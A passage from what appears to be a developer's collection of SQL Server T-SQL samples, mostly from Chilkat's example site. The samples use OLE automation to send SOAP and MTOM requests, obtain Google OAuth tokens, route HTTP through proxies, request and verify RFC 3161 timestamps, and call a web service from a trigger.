    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.HttpRequest', @req OUT

    EXEC sp_OASetProperty @req, 'HttpVerb', 'POST'
    EXEC sp_OASetProperty @req, 'Path', '/something/someTarget'

    EXEC sp_OASetProperty @req, 'ContentType', 'multipart/related; start-info="text/xml"; type="application/xop+xml"'
    EXEC sp_OAMethod @req, 'AddHeader', NULL, 'SOAPAction', 'some-SOAP-action'

    EXEC sp_OAMethod @req, 'AddStringForUpload2', @success OUT, '', '', @xmlBody, 'utf-8', 'application/xop+xml; type="text/xml"; charset=utf-8'

    -- The bytes will be sent as binary (not base64 encoded).
    EXEC sp_OAMethod @req, 'AddFileForUpload2', @success OUT, '', 'qa_data/jpg/starfish.jpg', 'image/jpeg'

    -- The JPEG data is the 2nd sub-part, and therefore is at index 1 (the first sub-part is at index 0)
    EXEC sp_OAMethod @req, 'AddSubHeader', @success OUT, 1, 'Content-ID', '<5aeaa450-17f0-4484-b845-a8480c363444@example.org>'

    EXEC sp_OASetProperty @http, 'FollowRedirects', 1

    -- For debugging, set the SessionLogFilename property
    -- to see the exact HTTP request and response in a log file.
    -- (Given that the request contains binary data, you'll need an editor
    -- that can gracefully view text + binary data.  I use EmEditor for most simple editing tasks..)
    EXEC sp_OASetProperty @http, 'SessionLogFilename', 'qa_output/mtom_sessionLog.txt'

    DECLARE @useTls int
    SELECT @useTls = 1
    -- Note: Please don't run this example without changing the domain to your own domain...
    DECLARE @resp int
    EXEC sp_OAMethod @http, 'SynchronousRequest', @resp OUT, 'www.example.org', 443, @useTls, @req
    EXEC sp_OAGetProperty @http, 'LastMethodSuccess', @iTmp0 OUT
    IF @iTmp0 <> 1
      BEGIN
        EXEC sp_OAGetProperty @http, 'LastErrorText', @sTmp0 OUT
        PRINT @sTmp0
        EXEC @hr = sp_OADestroy @http
        EXEC @hr = sp_OADestroy @soapXml
        EXEC @hr = sp_OADestroy @req
        RETURN
      END

    DECLARE @xmlResponse int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.Xml', @xmlResponse OUT

    EXEC sp_OAGetProperty @resp, 'BodyStr', @sTmp0 OUT
    EXEC sp_OAMethod @xmlResponse, 'LoadXml', @success OUT, @sTmp0
    EXEC sp_OAMethod @xmlResponse, 'GetXml', @sTmp0 OUT
    PRINT @sTmp0
    EXEC @hr = sp_OADestroy @resp


    EXEC @hr = sp_OADestroy @http
    EXEC @hr = sp_OADestroy @soapXml
    EXEC @hr = sp_OADestroy @req
    EXEC @hr = sp_OADestroy @xmlResponse


END
GO


https://www.example-code.com/sql/http_xoauth2_access_token.asp

CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @iTmp0 int
    DECLARE @sTmp0 nvarchar(4000)
    -- This example assumes the Chilkat API to have been previously unlocked.
    -- See Global Unlock Sample for sample code.

    DECLARE @http int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.Http', @http OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    -- When a service account (Client ID) is created at https://code.google.com/apis/console/
    -- Google will generate a P12 key.  This is a PKCS12 (PFX) file that you will download
    -- and save.  The password to access the contents of this file is "notasecret".
    -- NOTE: The Chilkat Pfx API provides the ability to load a PFX/P12 and re-save
    -- with a different password.

    -- Begin by loading the downloaded .p12 into a Chilkat certificate object:
    DECLARE @cert int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.Cert', @cert OUT

    DECLARE @success int
    EXEC sp_OAMethod @cert, 'LoadPfxFile', @success OUT, '/myDir/API Project-1c43a291e2a1-notasecret.p12', 'notasecret'
    IF @success <> 1
      BEGIN
        EXEC sp_OAGetProperty @cert, 'LastErrorText', @sTmp0 OUT
        PRINT @sTmp0
        EXEC @hr = sp_OADestroy @http
        EXEC @hr = sp_OADestroy @cert
        RETURN
      END

    -- The next (and final) step is to request the access token.  Chilkat internally
    -- does all the work of forming the JWT header and JWT claim set, encoding and
    -- signing the JWT, and sending the access token request.
    -- The application need only provide the inputs: The iss, scope(s), sub, and the
    -- desired duration with a max of 3600 seconds (1 hour).
    -- 
    -- Each of these inputs is defined as follows 
    -- (see https://developers.google.com/accounts/docs/OAuth2ServiceAccount
    -- 
    -- iss: The email address of the service account.
    -- 
    -- scope: A space-delimited list of the permissions that the application requests.
    -- 
    -- sub: required if there is an email address, such as for a
    --   Google Apps domain—if you use Google Apps for Work, where the administrator of the Google Apps domain 
    --   can authorize an application to access user data on behalf of users in the Google Apps domain.
    -- 
    -- numSec: The number of seconds for which the access token will be valid (max 3600).

    DECLARE @iss nvarchar(4000)
    SELECT @iss = '761326798069-r5mljlln1rd4lrbhg75efgigp36m78j5@developer.gserviceaccount.com'
    DECLARE @scope nvarchar(4000)
    SELECT @scope = 'https://mail.google.com/'
    -- Leave "sub" empty if there is no Google Apps email.
    DECLARE @sub nvarchar(4000)
    SELECT @sub = ''
    DECLARE @numSec int
    SELECT @numSec = 3600

    DECLARE @accessToken nvarchar(4000)
    EXEC sp_OAMethod @http, 'G_SvcOauthAccessToken', @accessToken OUT, @iss, @scope, @sub, @numSec, @cert
    EXEC sp_OAGetProperty @http, 'LastMethodSuccess', @iTmp0 OUT
    IF @iTmp0 <> 1
      BEGIN
        EXEC sp_OAGetProperty @http, 'LastErrorText', @sTmp0 OUT
        PRINT @sTmp0
      END
    ELSE
      BEGIN

        PRINT 'access token: ' + @accessToken
      END

    EXEC @hr = sp_OADestroy @http
    EXEC @hr = sp_OADestroy @cert


END
GO



https://www.example-code.com/sql/http_soapPost11.asp


CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @iTmp0 int
    DECLARE @sTmp0 nvarchar(4000)
    -- This example requires the Chilkat API to have been previously unlocked.
    -- See Global Unlock Sample for sample code.

    DECLARE @http int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.Http', @http OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    -- Generate the following XML:

    -- <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:smar="http://smartbear.com">
    --    <soapenv:Header/>
    --    <soapenv:Body>
    --       <smar:HelloWorld/>
    --    </soapenv:Body>
    -- </soapenv:Envelope>

    DECLARE @soapXml int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.Xml', @soapXml OUT

    EXEC sp_OASetProperty @soapXml, 'Tag', 'soapenv:Envelope'
    EXEC sp_OAMethod @soapXml, 'AddAttribute', @success OUT, 'xmlns:soapenv', 'http://schemas.xmlsoap.org/soap/envelope/'
    EXEC sp_OAMethod @soapXml, 'AddAttribute', @success OUT, 'xmlns:smar', 'http://smartbear.com'
    EXEC sp_OAMethod @soapXml, 'UpdateChildContent', NULL, 'soapenv:Header', ''
    EXEC sp_OAMethod @soapXml, 'UpdateChildContent', NULL, 'soapenv:Body|smar:HelloWorld', ''

    EXEC sp_OAMethod @soapXml, 'GetXml', @sTmp0 OUT
    PRINT @sTmp0

    DECLARE @req int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.HttpRequest', @req OUT

    EXEC sp_OASetProperty @req, 'HttpVerb', 'POST'
    EXEC sp_OASetProperty @req, 'SendCharset', 0
    EXEC sp_OAMethod @req, 'AddHeader', NULL, 'Content-Type', 'text/xml; charset=utf-8'
    EXEC sp_OAMethod @req, 'AddHeader', NULL, 'SOAPAction', 'http://smartbear.com/HelloWorld'
    EXEC sp_OASetProperty @req, 'Path', '/samples/testcomplete10/webservices/Service.asmx'
    DECLARE @success int
    EXEC sp_OAMethod @soapXml, 'GetXml', @sTmp0 OUT
    EXEC sp_OAMethod @req, 'LoadBodyFromString', @success OUT, @sTmp0, 'utf-8'

    EXEC sp_OASetProperty @http, 'FollowRedirects', 1

    DECLARE @resp int

    EXEC sp_OAMethod @http, 'SynchronousRequest', @resp OUT, 'secure.smartbearsoftware.com', 80, 0, @req
    EXEC sp_OAGetProperty @http, 'LastMethodSuccess', @iTmp0 OUT
    IF @iTmp0 = 0
      BEGIN
        EXEC sp_OAGetProperty @http, 'LastErrorText', @sTmp0 OUT
        PRINT @sTmp0
      END
    ELSE
      BEGIN
        DECLARE @xmlResponse int
        EXEC @hr = sp_OACreate 'Chilkat_9_5_0.Xml', @xmlResponse OUT

        EXEC sp_OAGetProperty @resp, 'BodyStr', @sTmp0 OUT
        EXEC sp_OAMethod @xmlResponse, 'LoadXml', @success OUT, @sTmp0
        EXEC sp_OAMethod @xmlResponse, 'GetXml', @sTmp0 OUT
        PRINT @sTmp0
        EXEC @hr = sp_OADestroy @resp

      END

    -- A successful XML response:

    -- <?xml version="1.0" encoding="utf-8" ?>
    -- <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
    --     <soap:Body>
    --         <HelloWorldResponse xmlns="http://smartbear.com">
    --             <HelloWorldResult>Hello World</HelloWorldResult>
    --         </HelloWorldResponse>
    --     </soap:Body>
    -- </soap:Envelope>

    EXEC @hr = sp_OADestroy @http
    EXEC @hr = sp_OADestroy @soapXml
    EXEC @hr = sp_OADestroy @req
    EXEC @hr = sp_OADestroy @xmlResponse


END
GO

https://www.example-code.com/sql/http_soapPost12.asp

CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @iTmp0 int
    DECLARE @sTmp0 nvarchar(4000)
    -- This example requires the Chilkat API to have been previously unlocked.
    -- See Global Unlock Sample for sample code.

    DECLARE @http int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.Http', @http OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    DECLARE @soapXml int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.Xml', @soapXml OUT

    EXEC sp_OASetProperty @soapXml, 'Tag', 'soap12:Envelope'
    DECLARE @success int
    EXEC sp_OAMethod @soapXml, 'AddAttribute', @success OUT, 'xmlns:xsi', 'http://www.w3.org/2001/XMLSchema-instance'
    EXEC sp_OAMethod @soapXml, 'AddAttribute', @success OUT, 'xmlns:xsd', 'http://www.w3.org/2001/XMLSchema'
    EXEC sp_OAMethod @soapXml, 'AddAttribute', @success OUT, 'xmlns:soap12', 'http://www.w3.org/2003/05/soap-envelope'

    EXEC sp_OAMethod @soapXml, 'NewChild2', NULL, 'soap12:Body', ''
    EXEC sp_OAMethod @soapXml, 'GetChild2', @success OUT, 0
    EXEC sp_OAMethod @soapXml, 'NewChild2', NULL, 'GetCityWeatherByZIP', ''
    EXEC sp_OAMethod @soapXml, 'GetChild2', @success OUT, 0
    EXEC sp_OAMethod @soapXml, 'AddAttribute', @success OUT, 'xmlns', 'http://ws.cdyne.com/WeatherWS/'
    EXEC sp_OAMethod @soapXml, 'NewChild2', NULL, 'ZIP', '60187'
    EXEC sp_OAMethod @soapXml, 'GetRoot2', NULL

    EXEC sp_OAMethod @soapXml, 'GetXml', @sTmp0 OUT
    PRINT @sTmp0

    DECLARE @req int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.HttpRequest', @req OUT

    EXEC sp_OASetProperty @req, 'HttpVerb', 'POST'
    EXEC sp_OASetProperty @req, 'SendCharset', 0
    EXEC sp_OAMethod @req, 'AddHeader', NULL, 'Content-Type', 'application/soap+xml; charset=utf-8'
    EXEC sp_OAMethod @req, 'AddHeader', NULL, 'SOAPAction', 'http://ws.cdyne.com/WeatherWS/GetCityWeatherByZIP'
    EXEC sp_OASetProperty @req, 'Path', '/WeatherWS/Weather.asmx'
    EXEC sp_OAMethod @soapXml, 'GetXml', @sTmp0 OUT
    EXEC sp_OAMethod @req, 'LoadBodyFromString', @success OUT, @sTmp0, 'utf-8'

    EXEC sp_OASetProperty @http, 'FollowRedirects', 1

    DECLARE @resp int
    EXEC sp_OAMethod @http, 'SynchronousRequest', @resp OUT, 'wsf.cdyne.com', 80, 0, @req
    EXEC sp_OAGetProperty @http, 'LastMethodSuccess', @iTmp0 OUT
    IF @iTmp0 = 0
      BEGIN
        EXEC sp_OAGetProperty @http, 'LastErrorText', @sTmp0 OUT
        PRINT @sTmp0
      END
    ELSE
      BEGIN
        DECLARE @xmlResponse int
        EXEC @hr = sp_OACreate 'Chilkat_9_5_0.Xml', @xmlResponse OUT

        EXEC sp_OAGetProperty @resp, 'BodyStr', @sTmp0 OUT
        EXEC sp_OAMethod @xmlResponse, 'LoadXml', @success OUT, @sTmp0
        EXEC sp_OAMethod @xmlResponse, 'GetXml', @sTmp0 OUT
        PRINT @sTmp0
        EXEC @hr = sp_OADestroy @resp

      END

    EXEC @hr = sp_OADestroy @http
    EXEC @hr = sp_OADestroy @soapXml
    EXEC @hr = sp_OADestroy @req
    EXEC @hr = sp_OADestroy @xmlResponse


END
GO


https://www.example-code.com/sql/http_quickgetstr.asp


CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    -- This example assumes the Chilkat API to have been previously unlocked.
    -- See Global Unlock Sample for sample code.

    DECLARE @http int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.Http', @http OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    -- Send the HTTP GET and return the content in a string.
    DECLARE @html nvarchar(4000)
    EXEC sp_OAMethod @http, 'QuickGetStr', @html OUT, 'http://www.wikipedia.org/'


    PRINT @html

    EXEC @hr = sp_OADestroy @http


END
GO


https://www.example-code.com/sql/http_proxy.asp


CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    -- This example assumes the Chilkat API to have been previously unlocked.
    -- See Global Unlock Sample for sample code.

    DECLARE @http int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.Http', @http OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    -- To use an HTTP proxy, set the following properties

    -- Use a domain name or IP address.
    EXEC sp_OASetProperty @http, 'ProxyDomain', '172.16.16.24'

    -- The port at which your HTTP proxy is listening for HTTP requests.
    EXEC sp_OASetProperty @http, 'ProxyPort', 808

    -- If your HTTP proxy requires authentication...
    EXEC sp_OASetProperty @http, 'ProxyLogin', 'myProxyLogin'
    EXEC sp_OASetProperty @http, 'ProxyPassword', 'myProxyPassword'

    -- At this point, all Chilkat HTTP methods for sending POST's, GET's, or anything else
    -- will use the HTTP proxy.  The remainder of your code is the same.
    -- Using an HTTP proxy only requires the above properties to be set beforehand...

    EXEC @hr = sp_OADestroy @http


END
GO


https://www.example-code.com/sql/squid_direct_tls_connection.asp


CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @iTmp0 int
    DECLARE @sTmp0 nvarchar(4000)
    -- This example requires the Chilkat API to have been previously unlocked.
    -- See Global Unlock Sample for sample code.

    DECLARE @http int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.Http', @http OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    -- Set the HTTP proxy domain or IP address.
    EXEC sp_OASetProperty @http, 'ProxyDomain', '172.16.16.46'
    -- The proxy port..
    EXEC sp_OASetProperty @http, 'ProxyPort', 3128

    -- Indicate that we are to use a direct TLS connection with the HTTP proxy
    -- (we use a Squid Cache: Version 4.11 for testing)
    EXEC sp_OASetProperty @http, 'ProxyDirectTls', 1

    -- If the proxy requires a login or password, we can set it here.
    -- Otherwise comment out these lines.
    EXEC sp_OASetProperty @http, 'ProxyLogin', 'myProxyLogin'
    EXEC sp_OASetProperty @http, 'ProxyPassword', 'myProxyPassword'

    -- All requests sent on the http object will now go through the proxy.
    -- Give it a test:
    DECLARE @s nvarchar(4000)
    EXEC sp_OAMethod @http, 'QuickGetStr', @s OUT, 'https://www.chilkatsoft.com/helloWorld.html'
    EXEC sp_OAGetProperty @http, 'LastMethodSuccess', @iTmp0 OUT
    IF @iTmp0 = 0
      BEGIN
        EXEC sp_OAGetProperty @http, 'LastErrorText', @sTmp0 OUT
        PRINT @sTmp0
        EXEC @hr = sp_OADestroy @http
        RETURN
      END

    -- The LastErrorText property also contains information when method call succeeds.
    -- Have a look to see that the request was sent through the proxy:
    EXEC sp_OAGetProperty @http, 'LastErrorText', @sTmp0 OUT
    PRINT @sTmp0


    PRINT '---'

    PRINT @s

    PRINT '---'

    PRINT 'Success for TLS destination over direct TLS HTTP proxy.'

    EXEC @hr = sp_OADestroy @http


END
GO






https://www.example-code.com/sql/timestamp_client.asp


CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @iTmp0 int
    DECLARE @sTmp0 nvarchar(4000)
    -- Note: Requires Chilkat v9.5.0.75 or greater.

    -- This requires the Chilkat API to have been previously unlocked.
    -- See Global Unlock Sample for sample code.

    -- First sha-256 hash the data that is to be timestamped.
    -- In this example, the data is the string "Hello World"
    DECLARE @success int

    DECLARE @crypt int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.Crypt2', @crypt OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    EXEC sp_OASetProperty @crypt, 'HashAlgorithm', 'sha256'
    EXEC sp_OASetProperty @crypt, 'EncodingMode', 'base64'
    DECLARE @base64Hash nvarchar(4000)
    EXEC sp_OAMethod @crypt, 'HashStringENC', @base64Hash OUT, 'Hello World'

    DECLARE @http int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.Http', @http OUT

    DECLARE @requestToken int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.BinData', @requestToken OUT

    DECLARE @optionalPolicyOid nvarchar(4000)
    SELECT @optionalPolicyOid = ''
    DECLARE @addNonce int
    SELECT @addNonce = 0
    DECLARE @requestTsaCert int
    SELECT @requestTsaCert = 1

    -- Create a time-stamp request token
    EXEC sp_OAMethod @http, 'CreateTimestampRequest', @success OUT, 'sha256', @base64Hash, @optionalPolicyOid, @addNonce, @requestTsaCert, @requestToken
    IF @success <> 1
      BEGIN
        EXEC sp_OAGetProperty @http, 'LastErrorText', @sTmp0 OUT
        PRINT @sTmp0
        EXEC @hr = sp_OADestroy @crypt
        EXEC @hr = sp_OADestroy @http
        EXEC @hr = sp_OADestroy @requestToken
        RETURN
      END

    -- Send the time-stamp request token to the TSA.
    -- This is the equivalent of the following CURL command:
    -- curl -H "Content-Type: application/timestamp-query" --data-binary '@file.tsq' https://freetsa.org/tsr > file.tsr
    DECLARE @tsaUrl nvarchar(4000)
    SELECT @tsaUrl = 'https://freetsa.org/tsr'
    -- Another timestamp server you could try is: http://timestamp.digicert.com
    SELECT @tsaUrl = 'http://timestamp.digicert.com'
    DECLARE @resp int
    EXEC sp_OAMethod @http, 'PBinaryBd', @resp OUT, 'POST', @tsaUrl, @requestToken, 'application/timestamp-query', 0, 0
    EXEC sp_OAGetProperty @http, 'LastMethodSuccess', @iTmp0 OUT
    IF @iTmp0 <> 1
      BEGIN
        EXEC sp_OAGetProperty @http, 'LastErrorText', @sTmp0 OUT
        PRINT @sTmp0
        EXEC @hr = sp_OADestroy @crypt
        EXEC @hr = sp_OADestroy @http
        EXEC @hr = sp_OADestroy @requestToken
        RETURN
      END

    -- Get the timestamp reply from the HTTP response object.
    DECLARE @timestampReply int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.BinData', @timestampReply OUT

    EXEC sp_OAMethod @resp, 'GetBodyBd', @success OUT, @timestampReply
    EXEC @hr = sp_OADestroy @resp

    -- Show the base64 encoded timestamp reply.
    EXEC sp_OAMethod @timestampReply, 'GetEncoded', @sTmp0 OUT, 'base64'
    PRINT @sTmp0

    -- Let's verify the timestamp reply against the TSA's cert, which we've previously downloaded.
    -- See https://freetsa.org/index_en.php
    DECLARE @tsaCert int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.Cert', @tsaCert OUT

    EXEC sp_OAMethod @tsaCert, 'LoadFromFile', @success OUT, 'qa_data/certs/freetsa.org.cer'
    IF @success <> 1
      BEGIN
        EXEC sp_OAGetProperty @tsaCert, 'LastErrorText', @sTmp0 OUT
        PRINT @sTmp0
        EXEC @hr = sp_OADestroy @crypt
        EXEC @hr = sp_OADestroy @http
        EXEC @hr = sp_OADestroy @requestToken
        EXEC @hr = sp_OADestroy @timestampReply
        EXEC @hr = sp_OADestroy @tsaCert
        RETURN
      END

    -- The VerifyTimestampReply method will return one of the following values:
    -- -1:  The timestampReply does not contain a valid timestamp reply.
    -- -2: The  timestampReply is a valid timestamp reply, but failed verification using the public key of the tsaCert.
    -- 0:  Granted and verified.
    -- 1: Granted and verified, with mods (see RFC 3161)
    -- 2: Rejected.
    -- 3: Waiting.
    -- 4: Revocation Warning
    -- 5: Revocation Notification
    DECLARE @pkiStatus int
    EXEC sp_OAMethod @http, 'VerifyTimestampReply', @pkiStatus OUT, @timestampReply, @tsaCert
    IF @pkiStatus < 0
      BEGIN
        EXEC sp_OAGetProperty @http, 'LastErrorText', @sTmp0 OUT
        PRINT @sTmp0
        EXEC @hr = sp_OADestroy @crypt
        EXEC @hr = sp_OADestroy @http
        EXEC @hr = sp_OADestroy @requestToken
        EXEC @hr = sp_OADestroy @timestampReply
        EXEC @hr = sp_OADestroy @tsaCert
        RETURN
      END


    PRINT 'pkiStatus = ' + @pkiStatus

    DECLARE @json int
    EXEC sp_OAMethod @http, 'LastJsonData', @json OUT
    EXEC sp_OASetProperty @json, 'EmitCompact', 0
    EXEC sp_OAMethod @json, 'Emit', @sTmp0 OUT
    PRINT @sTmp0

    -- The LastJsonData looks like the following.
    -- Note: The "timestampReply.pkiStatus" portion of the LastJsonData was added in Chilkat v9.5.0.83

    -- Use this online tool to generate parsing code from sample JSON: 
    -- Generate Parsing Code from JSON

    -- {
    --   "timestampReply": {
    --     "pkiStatus": {
    --       "value": 0,
    --       "meaning": "granted"
    --     }
    --   },
    --   "pkcs7": {
    --     "verify": {
    --       "digestAlgorithms": [
    --         "sha256"
    --       ],
    --       "signerInfo": [
    --         {
    --           "cert": {
    --             "serialNumber": "04CD3F8568AE76C61BB0FE7160CCA76D",
    --             "issuerCN": "DigiCert SHA2 Assured ID Timestamping CA",
    --             "digestAlgOid": "2.16.840.1.101.3.4.2.1",
    --             "digestAlgName": "SHA256"
    --           },
    --           "contentType": "1.2.840.113549.1.9.16.1.4",
    --           "signingTime": "200405023019Z",
    --           "messageDigest": "f14zOsdnN9vyyV3HjjBiLzNDi1PF28hAFMODxNkNRZs=",
    --           "signingAlgOid": "1.2.840.113549.1.1.1",
    --           "signingAlgName": "RSA-PKCSV-1_5",
    --           "authAttr": {
    --             "1.2.840.113549.1.9.3": {
    --               "name": "contentType",
    --               "oid": "1.2.840.113549.1.9.16.1.4"
    --             },
    --             "1.2.840.113549.1.9.5": {
    --               "name": "signingTime",
    --               "utctime": "200405023019Z"
    --             },
    --             "1.2.840.113549.1.9.16.2.12": {
    --               "name": "signingCertificate",
    --               "der": "MBowGDAWBBQDJb1QXtqWMC3CL0+gHkwovig0xQ=="
    --             },
    --             "1.2.840.113549.1.9.4": {
    --               "name": "messageDigest",
    --               "digest": "f14zOsdnN9vyyV3HjjBiLzNDi1PF28hAFMODxNkNRZs="
    --             }
    --           }
    --         }
    --       ]
    --     }
    --   }
    -- }

    DECLARE @signingTime int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.DtObj', @signingTime OUT

    DECLARE @authAttrSigningTimeUtctime int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.DtObj', @authAttrSigningTimeUtctime OUT

    DECLARE @strVal nvarchar(4000)

    DECLARE @certSerialNumber nvarchar(4000)

    DECLARE @certIssuerCN nvarchar(4000)

    DECLARE @certDigestAlgOid nvarchar(4000)

    DECLARE @certDigestAlgName nvarchar(4000)

    DECLARE @contentType nvarchar(4000)

    DECLARE @messageDigest nvarchar(4000)

    DECLARE @signingAlgOid nvarchar(4000)

    DECLARE @signingAlgName nvarchar(4000)

    DECLARE @authAttrContentTypeName nvarchar(4000)

    DECLARE @authAttrContentTypeOid nvarchar(4000)

    DECLARE @authAttrSigningTimeName nvarchar(4000)

    DECLARE @authAttrSigningCertificateName nvarchar(4000)

    DECLARE @authAttrSigningCertificateDer nvarchar(4000)

    DECLARE @authAttrMessageDigestName nvarchar(4000)

    DECLARE @authAttrMessageDigestDigest nvarchar(4000)

    DECLARE @timestampReplyPkiStatusValue int
    EXEC sp_OAMethod @json, 'IntOf', @timestampReplyPkiStatusValue OUT, 'timestampReply.pkiStatus.value'
    DECLARE @timestampReplyPkiStatusMeaning nvarchar(4000)
    EXEC sp_OAMethod @json, 'StringOf', @timestampReplyPkiStatusMeaning OUT, 'timestampReply.pkiStatus.meaning'
    DECLARE @i int
    SELECT @i = 0
    DECLARE @count_i int
    EXEC sp_OAMethod @json, 'SizeOfArray', @count_i OUT, 'pkcs7.verify.digestAlgorithms'
    WHILE @i < @count_i
      BEGIN
        EXEC sp_OASetProperty @json, 'I', @i
        EXEC sp_OAMethod @json, 'StringOf', @strVal OUT, 'pkcs7.verify.digestAlgorithms[i]'
        SELECT @i = @i + 1
      END
    SELECT @i = 0
    EXEC sp_OAMethod @json, 'SizeOfArray', @count_i OUT, 'pkcs7.verify.signerInfo'
    WHILE @i < @count_i
      BEGIN
        EXEC sp_OASetProperty @json, 'I', @i
        EXEC sp_OAMethod @json, 'StringOf', @certSerialNumber OUT, 'pkcs7.verify.signerInfo[i].cert.serialNumber'
        EXEC sp_OAMethod @json, 'StringOf', @certIssuerCN OUT, 'pkcs7.verify.signerInfo[i].cert.issuerCN'
        EXEC sp_OAMethod @json, 'StringOf', @certDigestAlgOid OUT, 'pkcs7.verify.signerInfo[i].cert.digestAlgOid'
        EXEC sp_OAMethod @json, 'StringOf', @certDigestAlgName OUT, 'pkcs7.verify.signerInfo[i].cert.digestAlgName'
        EXEC sp_OAMethod @json, 'StringOf', @contentType OUT, 'pkcs7.verify.signerInfo[i].contentType'
        EXEC sp_OAMethod @json, 'DtOf', @success OUT, 'pkcs7.verify.signerInfo[i].signingTime', 0, @signingTime
        EXEC sp_OAMethod @json, 'StringOf', @messageDigest OUT, 'pkcs7.verify.signerInfo[i].messageDigest'
        EXEC sp_OAMethod @json, 'StringOf', @signingAlgOid OUT, 'pkcs7.verify.signerInfo[i].signingAlgOid'
        EXEC sp_OAMethod @json, 'StringOf', @signingAlgName OUT, 'pkcs7.verify.signerInfo[i].signingAlgName'
        EXEC sp_OAMethod @json, 'StringOf', @authAttrContentTypeName OUT, 'pkcs7.verify.signerInfo[i].authAttr."1.2.840.113549.1.9.3".name'
        EXEC sp_OAMethod @json, 'StringOf', @authAttrContentTypeOid OUT, 'pkcs7.verify.signerInfo[i].authAttr."1.2.840.113549.1.9.3".oid'
        EXEC sp_OAMethod @json, 'StringOf', @authAttrSigningTimeName OUT, 'pkcs7.verify.signerInfo[i].authAttr."1.2.840.113549.1.9.5".name'
        EXEC sp_OAMethod @json, 'DtOf', @success OUT, 'pkcs7.verify.signerInfo[i].authAttr."1.2.840.113549.1.9.5".utctime', 0, @authAttrSigningTimeUtctime
        EXEC sp_OAMethod @json, 'StringOf', @authAttrSigningCertificateName OUT, 'pkcs7.verify.signerInfo[i].authAttr."1.2.840.113549.1.9.16.2.12".name'
        EXEC sp_OAMethod @json, 'StringOf', @authAttrSigningCertificateDer OUT, 'pkcs7.verify.signerInfo[i].authAttr."1.2.840.113549.1.9.16.2.12".der'
        EXEC sp_OAMethod @json, 'StringOf', @authAttrMessageDigestName OUT, 'pkcs7.verify.signerInfo[i].authAttr."1.2.840.113549.1.9.4".name'
        EXEC sp_OAMethod @json, 'StringOf', @authAttrMessageDigestDigest OUT, 'pkcs7.verify.signerInfo[i].authAttr."1.2.840.113549.1.9.4".digest'
        SELECT @i = @i + 1
      END

    EXEC @hr = sp_OADestroy @json


    EXEC @hr = sp_OADestroy @crypt
    EXEC @hr = sp_OADestroy @http
    EXEC @hr = sp_OADestroy @requestToken
    EXEC @hr = sp_OADestroy @timestampReply
    EXEC @hr = sp_OADestroy @tsaCert
    EXEC @hr = sp_OADestroy @signingTime
    EXEC @hr = sp_OADestroy @authAttrSigningTimeUtctime


END
GO





























https://abrahamjohnblog.wordpress.com/call-web-service-from-database/
sp_configure 'show advanced options', 1;
GO
RECONFIGURE;
GO
sp_configure 'Ole Automation Procedures', 1;
GO
RECONFIGURE;
GO

Create Procedure CallWebService 
AS

Declare @Object as Int;
Declare @ResponseText as Varchar(8000);
Declare @WebServiceUrl as varchar(max)
Set @WebServiceUrl = 'http://localhost:60711/WebService1.asmx/RefreshTasks'

--Exec sp_OACreate 'MSXML2.XMLHTTP', @Object OUT;
Exec sp_OACreate 'MSXML2.ServerXMLHTTP', @Object OUT;
Exec sp_OAMethod @Object, 'open', NULL, 'GET', @WebServiceUrl, false
Exec sp_OAMethod @Object, 'send'
Exec sp_OAGetProperty @Object, 'responseText', @ResponseText OUT
Select @ResponseText as response
Exec sp_OADestroy @Object
RETURN
CREATE TRIGGER NOTIFY
 ON Task 
 AFTER INSERT, UPDATE,DELETE
 AS
BEGIN
 EXEC dbo.CallWebService 
END
https://www.sqlindia.com/binary-data-into-file-system-using-ole-automation-sqlserver/

/*
WWW.SQLINDIA.COM
Date: 10-01-2014 (MM:DD:YY)
*/
DECLARE @outPutPath varchar(50) = 'D:\temp'
, @i int
, @init int
, @data varbinary(max)
, @fname varchar(100)
, @fPath varchar(100)
, @xtn varchar(10)

DECLARE @table TABLE (id int identity(1,1), file_data varbinary(max), file_n varchar(100), file_x varchar(10))

INSERT INTO @table
SELECT file_data, [file_name], file_extension FROM ExtractFile

SELECT @i = COUNT(1) FROM @table

WHILE @i >= 1
BEGIN

